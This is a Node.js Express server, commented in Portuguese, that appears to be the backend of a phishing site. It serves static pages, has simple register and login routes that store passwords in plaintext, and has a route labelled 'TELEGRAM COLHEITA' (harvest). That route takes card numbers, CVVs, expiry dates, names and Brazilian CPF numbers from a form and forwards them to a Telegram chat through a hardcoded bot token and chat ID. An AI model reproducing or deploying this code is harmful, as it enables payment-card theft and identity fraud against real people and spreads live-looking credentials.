const express = require('express');
const path = require('path');
const fs = require('fs');
const fetch = require("node-fetch");
const app = express();

app.use(express.json());


// Serve arquivos estáticos da pasta "site"
app.use(express.static(path.join(__dirname, 'site')));

// Redireciona / para o index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'site', 'index.html'));
});

// Inicia o servidor
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});

//REGISTRO
const usersFile = './users.txt';

app.post('/register', (req, res) => {
  const { username, password, fullname } = req.body;

  if (!username || !password || !fullname) {
    return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
  }

  // Verifica se já existe
  if (fs.existsSync(usersFile)) {
    const existingUsers = fs.readFileSync(usersFile, 'utf-8').split('\n');
    const exists = existingUsers.some(line => {
      const [savedUsername] = line.split('|');
      return savedUsername === username;
    });

    if (exists) {
      return res.json({ success: false, message: 'Usuário já existe.' });
    }
  }

  // Salva novo usuário
  const userLine = `${username}|${password}|${fullname}\n`;
  fs.appendFileSync(usersFile, userLine);
  res.json({ success: true });
});

//login
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.json({ success: false, message: 'Informe usuário e senha.' });
  }

  fs.readFile('./users.txt', 'utf8', (err, data) => {
    if (err) {
      console.error('Erro ao ler users.txt:', err);
      return res.json({ success: false, message: 'Erro no servidor.' });
    }

    const users = data.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0)
      .map(line => {
        const parts = line.split('|');
        return {
          username: parts[0],
          password: parts[1],
          fullname: parts[2]
        };
      });

    const user = users.find(u => u.username === username && u.password === password);

    if (user) {
      res.json({ success: true, fullname: user.fullname });
    } else {
      res.json({ success: false, message: 'Usuário ou senha inválidos.' });
    }
  });
});

//TELEGRAM COLHEITA

const TELEGRAM_TOKEN = "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
const CHAT_ID = "-1002852733056"; 

app.post("/enviar", async (req, res) => {
    try {
        const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;

        const mensagem = `
💳 Novo Cartão:
Número: ${cardNumber}
CVV: ${cardcvvName}
Validade: ${expiry}
Nome: ${cardholderNameC}
Cpf: ${cardholderIdentificationNumber}
        `;

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensagem
            })
        });

        const data = await response.json();
        console.log("Resposta do Telegram:", data);

        if (!data.ok) {
            res.status(500).send(`Erro do Telegram: ${data.description}`);
        } else {
            res.send("Mensagem enviada com sucesso para o Telegram!");
        }
    } catch (error) {
        console.error("Erro no envio:", error.message, error.stack);
        res.status(500).send("Erro no servidor");
    }
});



